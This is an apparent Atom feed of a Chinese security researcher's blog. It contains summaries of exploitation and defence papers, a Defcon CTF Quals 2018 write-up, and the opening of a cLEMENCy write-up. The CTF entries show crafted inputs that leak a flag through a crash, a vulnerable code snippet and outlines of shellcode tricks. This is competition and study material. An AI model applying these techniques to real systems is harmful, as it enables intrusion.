<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>星博‘s</title>
  
  <subtitle>PHD的自我修养</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://windcarp.github.io/"/>
  <updated>2018-11-12T06:58:06.000Z</updated>
  <id>https://windcarp.github.io/</id>
  
  <author>
    <name>cxm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Lord of the X86 Rings-A Portable User Mode Privilege Separation Architecture on X86 (CCS 18)</title>
    <link href="https://windcarp.github.io/2018/11/11/LOTR_x86_Share/"/>
    <id>https://windcarp.github.io/2018/11/11/LOTR_x86_Share/</id>
    <published>2018-11-10T17:32:26.000Z</published>
    <updated>2018-11-12T06:58:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LOTRx86-Lord-of-the-X86-Rings-A-Portable-User-Mode-Privilege-Separation-Architecture-on-X86-CCS’18"><a href="#LOTRx86-Lord-of-the-X86-Rings-A-Portable-User-Mode-Privilege-Separation-Architecture-on-X86-CCS’18" class="headerlink" title="[LOTRx86] Lord of the X86 Rings: A Portable User Mode Privilege Separation Architecture on X86(CCS’18)"></a><strong>[LOTRx86] Lord of the X86 Rings: A Portable User Mode Privilege Separation Architecture on X86(CCS’18)</strong></h1><p><strong>Paper:</strong> <a href="https://dl.acm.org/citation.cfm?id=3243748" target="_blank" rel="noopener">https://dl.acm.org/citation.cfm?id=3243748</a></p><p><strong>Slide:</strong> <a href="http://t.cn/EAYlx9E" target="_blank" rel="noopener">http://t.cn/EAYlx9E</a></p><hr><iframe src="https://www.slideshare.net/slideshow/embed_code/key/pQ3s3OIJGeFmpX" width="800" height="600" frameborder="0" allowfullscreen></iframe><hr><h2 id="Background-Portable-In-Process-isolation"><a href="#Background-Portable-In-Process-isolation" class="headerlink" title="Background: Portable In-Process isolation"></a>Background: Portable In-Process isolation</h2><p>现代应用程序通常涉及敏感信息的处理。但是，用户空间内缺少权限分离会使敏感的应用程序秘密（例如加密密钥）像“hello world”字符串一样不受保护。虽然 Intel 等芯片厂商正在引入尖端的硬件支持，如 CET, SGX 等。但是，这些功能通常是特定于供应商的，或者与老一代处理器不兼容。这种情况使开发人员无法使用便携式解决方案来保护敏感应用程序组件。</p><p>这篇文章的贡献是，提出了LOTRx86，这是一种用于用户空间权限分离的基本且可移植的方法。我们的方法通过利用x86体系结构中未充分利用的中间权限级别来创建名为PrivUser的更高权限的用户执行层。 PrivUser内存空间是进程地址空间中用户模式无法访问的一组页面，用于存储敏感数据与访问敏感数据的代码。</p><h2 id="Design-Privilege-Mode"><a href="#Design-Privilege-Mode" class="headerlink" title="Design - Privilege Mode"></a>Design - Privilege Mode</h2><p><img src="https://loccs.sjtu.edu.cn/gossip/images/2018-10-30/1.png" alt=""></p><p>作者将敏感数据代码所在特权等级(r2)称为PrivUser-mode。用户模式由于页面属性的限制不能访问到内核及PrivUser，而作者将R2所在段的段基地地址与段限写在固定的位置，使得PrivUser的代码不能访问到内核。用用户可以将特殊的数据如密钥等标记为敏感数据从而存放在PrivUser所在的S页面中。而需要访问到这些敏感数据需要先将处理器提升到R2级别。作者将访问数据的函数同样放到PrivUser所在的内存中。[1]</p><h2 id="Design-Call-Gate"><a href="#Design-Call-Gate" class="headerlink" title="Design - Call Gate"></a>Design - Call Gate</h2><p><img src="https://loccs.sjtu.edu.cn/gossip/images/2018-10-30/2.png" alt=""></p><p>如上图即为作者的跨段跳转示意图，作者借助r1作为一个跨段跳转板，原因是他将R2段中的L标志(32位兼容模式)置位了，而跨段跳转指令不允许从一个非32位段跳到一个32位段，因此只能采用一些比较 Tricky 的方法：先进入R1将特权等级提升，再通过段返回指令(lret)到PrivUser mode[1]。</p><p>这里设计主要出于两个动机：</p><ol><li><p>作者这里是想利用 Ring 1 和 Ring 2 两个特权级别。但是这两个级别在 x86_64 的 64位模式下，对于 Data Segment，是没有 Ring 1 和 Ring 2, Ring 0 的区别的。因此，作者想引入 32位模式下的寻址模式，利用现有段页式寻址的模式，就必须让代码运行在32位模式下。但是如果直接运行在 32位 模式下，又没办法直接跳转过来，就只能设计 Call Gate。<strong>这是 Call Gate 存在的意义</strong>。</p></li><li><p>但是为什么这里把 Call Gate 放在 Ring 1 呢？作者在文中专门给出了解释，<strong>为了做到更稳健的特权分离</strong>：因为 64-bit mode 下的代码，即使在 Ring 1/2 层，也是可以访问 Ring 0 的数据的。如果 Call Gate 在 Ring 2 层，理论上 Ring 2 层的敏感代码是可以直接跳到 Ring 2 层的 Call Gate 上，而 64-bit mode 下的 Call Gate 理论上又对所有的 Ring 0/1/2 数据都有访问权限；因此必须将 Call Gate 放在 Ring 1 上，为了保证 Ring 2 的 x86 代码无法直接跳转到 Call Gate。</p></li></ol><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><p><img src="https://loccs.sjtu.edu.cn/gossip/images/2018-10-30/3.png" alt=""></p><p>作者定义了一个宏，这个宏接受函数名称和参数类型等作为参数，并对外导出一个调用接口。开发者将访问敏感数据的函数导出，然后在主程序中使用系统所提供的宏来访问这个函数。由于PrivUser层的数据代码是32位兼容的，因此作者直接将这段内容直接链接进可以执行文件中。并且作者修改了libc中的malloc等内存分配函数使得PrivUser中的函数分配的内存始终在PrivUser内存中。其中包含一个内核模块，其功能为初始化LDT，初始化PrivUser内存，写入跨段跳转中转指令等。[1]</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://securitygossip.com/blog/2018/10/30/lord-of-the-x86-rings-a-portable-user-mode-privilege-separation-architecture-on-x86/" target="_blank" rel="noopener">https://securitygossip.com/blog/2018/10/30/lord-of-the-x86-rings-a-portable-user-mode-privilege-separation-architecture-on-x86/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;LOTRx86-Lord-of-the-X86-Rings-A-Portable-User-Mode-Privilege-Separation-Architecture-on-X86-CCS’18&quot;&gt;&lt;a href=&quot;#LOTRx86-Lord-of-the-X8
      
    
    </summary>
    
      <category term="Academic" scheme="https://windcarp.github.io/categories/Academic/"/>
    
    
      <category term="Paper" scheme="https://windcarp.github.io/tags/Paper/"/>
    
  </entry>
  
  <entry>
    <title>BOP-Block Oriented Programing(CCS 18)</title>
    <link href="https://windcarp.github.io/2018/10/11/BOP_Share/"/>
    <id>https://windcarp.github.io/2018/10/11/BOP_Share/</id>
    <published>2018-10-10T17:32:26.000Z</published>
    <updated>2018-10-10T10:03:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BOP-Block-Oriented-Programming-Automating-Data-Only-Attacks-CCS’18"><a href="#BOP-Block-Oriented-Programming-Automating-Data-Only-Attacks-CCS’18" class="headerlink" title="[BOP] Block Oriented Programming Automating Data-Only Attacks(CCS’18)"></a><strong>[BOP] Block Oriented Programming Automating Data-Only Attacks(CCS’18)</strong></h1><p><strong>Paper:</strong> <a href="https://arxiv.org/abs/1805.04767" target="_blank" rel="noopener">https://arxiv.org/abs/1805.04767</a></p><p><strong>Slide:</strong> <a href="http://t.cn/E7LdDfB" target="_blank" rel="noopener">http://t.cn/E7LdDfB</a></p><hr><iframe src="https://www.slideshare.net/slideshow/embed_code/key/ewH4NgabESeFDt" width="800" height="600" frameborder="0" allowfullscreen></iframe><hr><p>随着控制流完整性（CFI）的广泛部署， 控制流劫持攻击/代码重用攻击变得更加困难。 CFI将控制流限制在有限的位置，严重限制了任意代码的执行。在高级控制流劫持防御 （如CFI和影子堆栈）下评估应用程序的剩余攻击面仍然是一个悬而未决的问题。</p><p>这篇文章介绍了BOPC（Block Oriented Programing Compiler），一种自动评估攻击者是否可以在使用 CFI/Shadowstack 防御强化的二进制文件上执行任意代码的机制。</p><ul><li>BOPC 的输入是以图灵完备的高级语言 SPL（Sploit Languate） 编写的 Exploit。</li><li>SPL Payload 被编译为程序的 Trace，执行该 Trace 即执行了 Exploit 定义的行为。</li></ul><p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw383rvtd1j30r706pmys.jpg" alt=""></p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fw3845vdk3j30sp0g076s.jpg" alt=""></p><h3 id="BOPC-分四步完成这个过程。"><a href="#BOPC-分四步完成这个过程。" class="headerlink" title="BOPC 分四步完成这个过程。"></a><strong>BOPC 分四步完成这个过程。</strong></h3><ol><li>使用 SPL 定义漏洞利用行为</li><li>找到功能块（Function Block）并选择适当的块</li><li>找到 BOP Gadget 的调度程序块（Dispatcher Block）</li><li>Chain BOP Gadgets</li></ol><p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw37pgr1d3j30ss07a0v8.jpg" alt=""></p><p>文中发现，将 SPL Payload 映射到程序 Trace 的问题是NP难的，因此BOPC首先通过修剪不可行路径来减少搜索空间，然后使用启发式方法来引导搜索到可能的路径。 </p><p>最后，BOPC 将 Trace 编码为一组内存写入。依赖程序的 AAW 漏洞，完成内存写入之后，可以从指定的 Entry Point 完成指定的行为。</p><p>经过测试，BOPC 在 130 个测试中，成功为 105 个 Case 生成了完成了至少一种操作的路径。</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw383bqlzjj30vs08g458.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BOP-Block-Oriented-Programming-Automating-Data-Only-Attacks-CCS’18&quot;&gt;&lt;a href=&quot;#BOP-Block-Oriented-Programming-Automating-Data-Only-At
      
    
    </summary>
    
      <category term="Academic" scheme="https://windcarp.github.io/categories/Academic/"/>
    
    
      <category term="Paper" scheme="https://windcarp.github.io/tags/Paper/"/>
    
  </entry>
  
  <entry>
    <title>Defcon CTF Quals 2018</title>
    <link href="https://windcarp.github.io/2018/05/16/Defcon%20CTF%20Quals%202018/"/>
    <id>https://windcarp.github.io/2018/05/16/Defcon CTF Quals 2018/</id>
    <published>2018-05-15T17:32:26.000Z</published>
    <updated>2018-10-10T09:41:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>上周末是 Defcon CTF Quals 2018的比赛，今年是更换主办方的第一年，之前都是 <strong>Legitimate Business Syndicate</strong>，比赛质量也一直很高；然而去年Defcon CTF 的五年合同到期，于是今年是新的主办方，拖了 n 久才确定的 <a href="https://www.oooverflow.io/" target="_blank" rel="noopener"><strong>Order of the Overflow</strong></a>。</p><p>大佬们一大部分来自Shellphish，例如非常眼熟的<strong>Yan Shoshitaishvili (@Zardus)</strong>。值得一提的是，他们中很多都是年轻教授。赛前一天在 Defcon China 碰到冯老师，打听到他也参与了出题审题。</p><p>今年依旧是被 <strong>Tea Delieverers</strong> 递茶队的大佬们带飞，我帮忙打下手。之前在 PCTF 中一名只差没有外卡，非常可惜，这次杨博士和各位史前巨佬们（又多又强）一起出动，很辛苦的认真怼了两天，拿到了<strong>第六名</strong>的好成绩。</p><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1frcgega3ksj31890ef158.jpg" alt=""></p><p>接下来从我的角度，列举几道 Binary 题目供大家体会题目的清奇风格。</p><hr><h2 id="TechSupport"><a href="#TechSupport" class="headerlink" title="TechSupport"></a>TechSupport</h2><p><strong>TL;DR：</strong> Gdb 调试 + Patch + Info leak，难度低，有新意。</p><h4 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h4><p>题目给的 Binary 是一个化学分子量计算器，题目 Binary 很小，核心代码：</p><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1frcgqkj0tzj30k3046q3o.jpg" alt=""></p><p>但远程连进去是一个（伪）AI 客服问一些 SB 问题，回答完之后说你在公网监听3456端口它会连接，感觉这个形式比较有新意。连进来之后，发现是 gdb 调试命令，在本地<code>gdbserver</code>执行，然后提示 license 不对。</p><p><strong>接下来的所有过程就是按照主办方的引导走下去</strong>。</p><p>分析 <code>gdbserver</code> 流量得知，其在license检查完的函数出口下断点并执行。同时会随机上传一段 Binary 看是否打 Patch。那我们第一步，在 <code>eh_frame</code> 处 <code>patch + 跳转</code>，过了 license 的检查；于此同时开始无脑写 <code>Angr Script</code>。（后来 license 确实是 Flag，只不过 Angr 跑不出来，浪费了半天）</p><p>之后，客服告诉我， Crash 了才会处理。有 Binary Crash 还不容易，随便 Patch 个无效地址取，并观察 <code>gdbserver</code> 的流量，发现 Crash 后会把我的处理参数取回去执行，并返回结果他那里没有 Crash。问题就变成了，如何构造参数使远程 Crash。</p><p>Binary 就很小，翻了半天没有任何溢出可能，不过 Crash 还是可以的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cal_main_element(<span class="keyword">int</span> *element_weight_stack)</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"The main element is %s, which accounts for %d%% of the total weight\n"</span>, </span><br><span class="line">  &amp;element_name[<span class="number">2</span> * idx],(<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="number">100</span> * max / sum));</span><br></pre></td></tr></table></figure><ol><li><strong><code>element_weight_stack</code>在对元素质量做统计时是直接覆盖</strong>;</li><li><strong><code>cal_main_element</code> 可能除0</strong>；</li></ol><p>那么我们只要在输入元素时，如 <code>./mcalc Ag5Ag0</code>，则统计结果是0。则触发 Crash，远程会告诉我们和它 Crash 时的不同，会打印如下信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#$#!!%^!!</span><br><span class="line">It seems like our program has crashed</span><br><span class="line">Just give me a second to try to reproduce the bug on our servers...</span><br><span class="line">I confirm that we were able to reproduce the bug on our side</span><br><span class="line">These are the differences in the program state at the moment it crashed:</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">REG              OUR SERVER                          YOUR INSTALLATION</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">rsi | 0x000000000001                      | 0x0000deadbeef</span><br><span class="line">r13 | 0x7fffffffed00 &gt; 0x0000000000000002 | 0x7fffffffe2a0 &gt; 0x0000000000000002</span><br><span class="line">rcx | 0x00000001a55c                      | 0x0000deadbeef</span><br></pre></td></tr></table></figure><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p>走到这里只剩下一步了。当时陷入了误区，尝试继续按照客服要求，构造完全相同的 Crash 场景，结果失败。杨博士提醒说，有可能是在<strong>打印寄存器信息导致 Inforleak</strong>。查看 Crash 点的寄存器，发现，<strong>RCX</strong>寄存器中存的是我们分子量的总和，我们只需要构造分子量指向 BSS 段的 <code>License (0x6033D0)</code>即可。</p><p>最后一步，<a href="(https://github.com/cxm95/CTF-Writeups/blob/master/DefconCTF_Quals_2018/tech-support/test.cpp"><strong>动态规划一下</strong></a>)，题目所给的分子量很难直接构造精确地址，于是算法弱渣捡起 DP，构造精确值，最后得到 Flag 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#$#!!%^!!</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">REG              OUR SERVER                          YOUR INSTALLATION</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">rbx | 0x000000000000                      | 0x0000deadbeef</span><br><span class="line">rcx | 0x0000006033d8 &gt; 0x31345e3339252565 | 0x0000deadbeef</span><br><span class="line"></span><br><span class="line">./mcalc Fm23Au1Pr1Fm0Au0Pr0FeFe00</span><br><span class="line">./mcalc Fm22Cf1Tl1Er1Fm0Cf0Tl0Er0SiSi00</span><br><span class="line">license(flag): %%license%%93^41</span><br></pre></td></tr></table></figure><h4 id="And-Finally"><a href="#And-Finally" class="headerlink" title="And Finally"></a>And Finally</h4><p>于是，我们作为一个盗版用户，从客服手中拿到了真正的 License。不同于千篇一律的套路题，高质量 CTF 往往不按套路出牌，有趣也能学到东西，而不是拿已有的利用套路反复用来用去，这点值得国内的 CTF 多多学习。</p><p>当然，这次 CTF 也有很多值得吐槽的地方，比如浪费生命的 <strong>POW</strong>，国内都已经不多见的<strong>猜猜猜</strong>题目，体验很差，可以到<a href="https://ctftime.org/event/608" target="_blank" rel="noopener">CTFTime</a> 感受一下。</p><hr><h2 id="Other-Challenges"><a href="#Other-Challenges" class="headerlink" title="Other Challenges"></a>Other Challenges</h2><h3 id="Babypwn1805"><a href="#Babypwn1805" class="headerlink" title="Babypwn1805"></a>Babypwn1805</h3><p>给了几行代码，没有 Binary，提供了方便爆破的重复启动。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">char asdf[1024];</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">long long index = 0;</span><br><span class="line">read(0, &amp;index, 1024);</span><br><span class="line">read(0, asdf+index, 8);</span><br><span class="line">read(0, &amp;index, 1024);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>利用</strong>：跳 <code>OneGadget</code>，不过做出来之后发现每次启动都会换 <code>Libc</code>。无力吐槽，不知 <code>intended solution</code> 是什么。</p><h3 id="Bitflipper"><a href="#Bitflipper" class="headerlink" title="Bitflipper"></a>Bitflipper</h3><p>嗯，没错，这次的题目都不喜欢给 Binary。这次的内容是修改4bit 之后帮你执行Binary，Binary 正常工作是有颜色的 ls 命令。题目可以理解为在 RowHammer 的条件下如何影响程序执行；据说 RowHarmmer 执行的条件越来越低（<a href="https://arxiv.org/abs/1710.00551" target="_blank" rel="noopener">Another Flip in the Wall of Rowhammer Defenses</a>）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ Which bit do you want to flip (0-81727)? 10000</span><br><span class="line">1 bits have been flipped</span><br><span class="line">MD5 of the new version: 55cb4321919e63cc65676689ba33066d</span><br><span class="line">Let me run the program for you now...</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">[-8mREADME</span><br><span class="line">abc.jpg</span><br><span class="line">[-8mdir</span><br><span class="line">[-8msecret_flag.txt</span><br><span class="line">test.doc</span><br><span class="line">[-8mversion.txt</span><br><span class="line">-------------------------------------------------------</span><br></pre></td></tr></table></figure><p>或者，会提示想把 Crash 发给我们。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash: ./dir: cannot execute binary file: Exec format error</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">Looks like you broke it!</span><br><span class="line">I would send you a core dump, but I could not find any in the current directory</span><br></pre></td></tr></table></figure><p>一开始没有思路的情况下，大家进行了惨无人道的爆破。</p><p><strong>利用：</strong></p><p>首先，通过改 Binary 头部 type 字段，将其识别为Crash 文件，如此 Dump 出 Binary。</p><p>接下来，修改 4 bit 影响程序的执行结果，大概思路是修改一些函数调用等关键位置的寄存器值。没有征求解题大佬的意见，不列举细节，有兴趣的同学可以考虑一下。</p><h3 id="Shellql"><a href="#Shellql" class="headerlink" title="Shellql"></a>Shellql</h3><p>给了 Binary 的一题，一个 php 加载的库，上次见到类似的题还是在 Pwnhub 。题目可以执行 Shellcode，但是开了沙箱保护，只能执行 read/write/exit，Shellcode 需要完成的工作，从数据库中查询 flag，并把结果返回；当然，还需要 leak 才能完成整个过程。</p><p><strong>利用：</strong></p><p>可以通过栈地址把 PHP Binary Dump 下来，并利用其中的 Eval 类方法（会触发 Syscall 退出，Pass），或者向已经打开了 fd 的数据库发送查询。</p><p>参考: <a href="https://blog.vero.site/post/shellql" target="_blank" rel="noopener">vero’s blog</a>，则是通过 Sql 查询，基于时间的盲注一位位猜出 Flag。</p><h3 id="NOP"><a href="#NOP" class="headerlink" title="NOP"></a>NOP</h3><p>给了 Binary 的议题。Shellql 需要构造功能 Shellcode，这题则是经典的 Shellcode 题目，字符限制在音符中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C1 C#1 D1 D#1 ... B1 C2 C#2...B9</span><br></pre></td></tr></table></figure><p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1frciysrcr3j312g0o6grf.jpg" alt=""></p><p>题目通过一个奇怪的映射把<code>0x001b - 0x67de</code>范围内的数字映射到这些音符上。在进入 Shellcode 之前，会清空所有寄存器，在栈上放上很多垃圾内容。Shellcode 位置位于<code>0x606000</code>。</p><p><strong>利用</strong>：</p><p>经典 Shellcode 题一般思路：<strong>首先</strong>看可利用的指令；如果已有指令不够用，则<strong>其次</strong>使用可利用的指令以及现场数据构造自己的地址，对Shellcode 自身进行修改；<strong>接下来</strong>构造 Read，读入真正的 Shellcode，并执行。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;上周末是 Defcon CTF Quals 2018的比赛，今年是更换主办方的第一年，之前都是 &lt;strong&gt;Legitimate Business Syndicate&lt;/strong&gt;，比赛质量也一直很高；然而去年Defcon CTF 的五年合同到期，于是今年是新的主办
      
    
    </summary>
    
      <category term="CTF-Pwn" scheme="https://windcarp.github.io/categories/CTF-Pwn/"/>
    
    
      <category term="Pwn" scheme="https://windcarp.github.io/tags/Pwn/"/>
    
      <category term="CTF" scheme="https://windcarp.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>论文阅读分享(2018)</title>
    <link href="https://windcarp.github.io/2018/04/11/Academic_share/"/>
    <id>https://windcarp.github.io/2018/04/11/Academic_share/</id>
    <published>2018-04-10T17:32:26.000Z</published>
    <updated>2018-10-10T09:37:31.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-SemFuzz-Semantics-based-Automatic-Generation-of-Proof-of-Concept-Exploits-CCS-17"><a href="#1-SemFuzz-Semantics-based-Automatic-Generation-of-Proof-of-Concept-Exploits-CCS-17" class="headerlink" title="1. SemFuzz: Semantics-based Automatic Generation of Proof-of-Concept Exploits (CCS 17)"></a>1. <strong>SemFuzz: Semantics-based Automatic Generation of Proof-of-Concept Exploits (CCS 17)</strong></h2><p>本篇发表在最新的CCS 2017上，其工作主要是，基于linux kernel，采集CVE和git log中隐含的漏洞信息，通过自然语言处理进行分析，并使用Fuzz的手段（粗粒度和细粒度），产生能运行到漏洞函数的POC exploit。</p><p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw388tg94mj30w10b0n5o.jpg" alt=""></p><p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fw3895lltxj30eb09caco.jpg" alt=""></p><p>最终的效果是在满足条件的122个CVE里成功产生了18个Poc，并顺便发现了一个0day和一个Undisclosed漏洞。</p><p><strong>Paper:</strong> <a href="https://acmccs.github.io/papers/p2139-youA.pdf" target="_blank" rel="noopener">https://acmccs.github.io/papers/p2139-youA.pdf</a></p><p><strong>Slide:</strong> <a href="http://t.cn/E7yAyog" target="_blank" rel="noopener">http://t.cn/E7yAyog</a></p><hr><h2 id="2-Address-Oblivious-Code-Reuse-On-the-Effectiveness-of-Leakage-Resilient-Diversity-NDSS17"><a href="#2-Address-Oblivious-Code-Reuse-On-the-Effectiveness-of-Leakage-Resilient-Diversity-NDSS17" class="headerlink" title="2. Address-Oblivious Code Reuse: On the Effectiveness of Leakage-Resilient Diversity (NDSS17)"></a>2. <strong>Address-Oblivious Code Reuse: On the Effectiveness of Leakage-Resilient Diversity (NDSS17)</strong></h2><p>这篇文章来自于MIT的Lincoln实验室，发表在今年的NDSS17上。这篇文章讲述的是针对防御Code Reuse方式的攻击，主要针对Execute Only，提出了一种新的利用方法AOCR(Address Oblivious Code Reuse)，这种方法可以绕过绝大多数的防御。</p><p>AOCR的攻击简单概括分两步：</p><ol><li>找到Indirect code pointer和函数的对应关系</li><li>通过Malicious Loop Redirection将找到的Code pointer进行Chaining并调用，完成操作</li></ol><p>这篇文章最后给出了Nginx和Apache的实际漏洞的利用（未放出代码），并绕过了绝大多数的防御措施。</p><p><strong>Paper:</strong> <a href="https://www.ics.uci.edu/~perl/ndss17_aocr.pdf" target="_blank" rel="noopener">https://www.ics.uci.edu/~perl/ndss17_aocr.pdf</a></p><p><strong>Slide:</strong> <a href="https://docs.google.com/presentation/d/1fQOzVHJlcpfsPokgQwLm45qBis1P4qX532JWbi89bgA/edit?usp=sharing" target="_blank" rel="noopener">https://docs.google.com/presentation/d/1fQOzVHJlcpfsPokgQwLm45qBis1P4qX532JWbi89bgA/edit?usp=sharing</a></p><hr><h2 id="3-Compiler-assisted-Code-Randomization-Oakland-18"><a href="#3-Compiler-assisted-Code-Randomization-Oakland-18" class="headerlink" title="3. Compiler-assisted Code Randomization (Oakland 18)"></a>3. <strong>Compiler-assisted Code Randomization (Oakland 18)</strong></h2><p>这篇文章是一篇基于编译器，做代码随机化的文章。</p><p>这篇文章的亮点是，和之前的工作相比，实现了Basic Block级的细粒度随机化，可以在Client端以很小的Overhead生成以及运行；而且和现有的软件部署系统相兼容；</p><p>其原理可以概述为，在编译时，收集关于程序的布局、Fixup、BasicBlock等必须的信息，在Client端使用Binary Rewriter根据这些信息，对BasicBlock进行随机排列。</p><p>最后作者基于LLVM和Gold plugin实现了原型系统，并取得了很低的Overhead。作者在会议后将开源原型代码。</p><p><strong>Paper:</strong> <a href="https://cs.brown.edu/~vpk/papers/ccr.sp18.pdf" target="_blank" rel="noopener">https://cs.brown.edu/~vpk/papers/ccr.sp18.pdf</a></p><p><strong>Slide:</strong> <a href="http://t.cn/E7yPCam" target="_blank" rel="noopener">http://t.cn/E7yPCam</a></p><hr><hr><h2 id="4-Getting-Started-at-LLVM-Yet-another-LLVM-Tutorial-实践沙龙分享"><a href="#4-Getting-Started-at-LLVM-Yet-another-LLVM-Tutorial-实践沙龙分享" class="headerlink" title="4. Getting Started at LLVM - Yet another LLVM Tutorial(实践沙龙分享)"></a>4. <strong>Getting Started at LLVM - Yet another LLVM Tutorial(实践沙龙分享)</strong></h2><p>周四晚在实验室简单分享了LLVM相关的入门知识。Slide里介绍了以下内容：</p><ul><li>编译器的一些背景知识</li><li>LLVM的设计</li><li>一些LLVM中重要的概念与IR语言</li><li>LLVM编译中的实现细节<ul><li>Pass与优化</li><li>Code Generator与SelectionDAG</li></ul></li><li>LLVM的引用</li></ul><p><strong>Slide:</strong> <a href="https://docs.google.com/presentation/d/18MS6hXvyGXJcjR5rpFFnUCNb8MYdoamrplIySchFPKM/edit?usp=sharing" target="_blank" rel="noopener">https://docs.google.com/presentation/d/18MS6hXvyGXJcjR5rpFFnUCNb8MYdoamrplIySchFPKM/edit?usp=sharing</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-SemFuzz-Semantics-based-Automatic-Generation-of-Proof-of-Concept-Exploits-CCS-17&quot;&gt;&lt;a href=&quot;#1-SemFuzz-Semantics-based-Automatic-Ge
      
    
    </summary>
    
      <category term="Academic" scheme="https://windcarp.github.io/categories/Academic/"/>
    
    
      <category term="Paper" scheme="https://windcarp.github.io/tags/Paper/"/>
    
  </entry>
  
  <entry>
    <title>Pwnhub沙龙：cLEMENCy题解</title>
    <link href="https://windcarp.github.io/2017/08/14/Writeup/"/>
    <id>https://windcarp.github.io/2017/08/14/Writeup/</id>
    <published>2017-08-14T07:27:12.000Z</published>
    <updated>2018-10-10T09:43:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>8月12日Pwnhub第一次沙龙，心想到要和一众大佬面基，心情异常激动，于是攥着讨来的邀请函，冒着12级大雨，满心欢喜的赶到了五环的小别墅。</p><p>上午的议题干货满满，有冠城大佬，360小姐姐和青博学弟flyyy的分享，中午的<strong>烧烤 + 德州扑克</strong>之后便是Pwnhub的经典项目CTF，其中Explorer大佬出了一道<code>cLEMENCy</code>架构的题目。</p><p>提到<code>cLEMENCy</code>就不得不提到刚过去的<code>Defcon 25 Final</code>。与去年的CGC不同，<code>Defcon Final</code>今年的规则是，主办方与比赛前一天24小时放出自定义架构，以及相应的<code>emulator</code>，留给参赛者24小时的准备时间。这样一来，所有的参赛队都站在了同一起跑线上，需要从0准备所有的工具。</p><h2 id="0x01-简介：9bit的奇怪架构"><a href="#0x01-简介：9bit的奇怪架构" class="headerlink" title="0x01 简介：9bit的奇怪架构"></a>0x01 简介：9bit的奇怪架构</h2><p><code>cLEMENCy（the LEgitbs Middle ENdian Computer architecture）</code>由LBS的lighting等大佬们设计。<code>cLEMENCy</code>的指令手册中给出了架构的所有细节。简单的总结如下：</p><ol><li><p>每字节由9bit组成；使用混合序存储，Register XXYYZZ → Memory YYXXZZ，Register XXYY → Memory YYXX</p><blockquote><p>“Each byte is 9 bits of data, bit 0 is the left most significant bit. Middle-Endian data stores bits 9 to 17, followed by bits 0 to 8, then bits 18 to 27 in memory when handling three bytes. Two bytes of data will have bits 9-17 then bits 0 to 8 written to 